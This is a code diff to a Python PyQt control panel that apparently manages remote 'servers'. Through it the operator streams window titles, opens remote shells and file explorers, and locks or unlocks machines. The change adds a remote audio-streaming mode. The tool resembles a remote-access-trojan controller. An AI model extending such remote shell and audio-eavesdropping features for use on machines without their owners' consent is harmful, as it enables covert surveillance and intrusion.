@@ -104,6 +104,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('updatePanel()'), self.updatePanel)
         self.connect(self, SIGNAL('executeShell()'), self.executeShell)
         self.connect(self, SIGNAL('executeExplorer()'), self.executeExplorer)
+        self.connect(self, SIGNAL('executeAudio()'), self.executeAudio)
 
     # Start Listen for Servers
     def startListen(self):
@@ -196,8 +197,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                 self.emit(SIGNAL('updateTable()'))
 
-                            elif mode == 'audioStreaming':
-                                print 'audio streaming start'
+                            elif mode == 'audioMode':
+                                self.signalAudio(self.sock)
 
                             elif mode == 'shellMode':
                                 self.signalShell(self.sock)
@@ -400,9 +401,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
 
             else:
-                for i in self.plugins:
-                    self.eMenu.addAction(QIcon(self.plugins[i]['icon']), self.plugins[i]['name'],
-                                         lambda plugin_name=i: self.runPlugin(plugin=plugin_name))
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'lock_2.png')), 'Start Audio', self.runAudio)
 
                 self.eMenu.addSeparator()
                 self.eMenu.addMenu(self.optionsMenu)
@@ -434,6 +433,27 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         args['ipAddress'] = self.socks[sockind]['ip_address']
         tmpid = self.id_generator()
         self.pluginsBank[tmpid] = mexplorer.mainPopup(args=args)
+        self.pluginsBank[tmpid].show()
+
+    def signalAudio(self, sock):
+        print 'signalAudio'
+        self.current_sock = sock
+        self.emit(SIGNAL('executeAudio()'))
+
+    def runAudio(self):
+        print 'runAudio'
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'audioMode')
+
+    def executeAudio(self):
+        print 'executeAudio'
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        args['socket'] = self.socks[sockind]['socket']
+        args['ipAddress'] = self.socks[sockind]['ip_address']
+        tmpid = self.id_generator()
+        self.pluginsBank[tmpid] = maudio.mainPopup(args=args)
         self.pluginsBank[tmpid].show()
 
     def signalShell(self, sock):
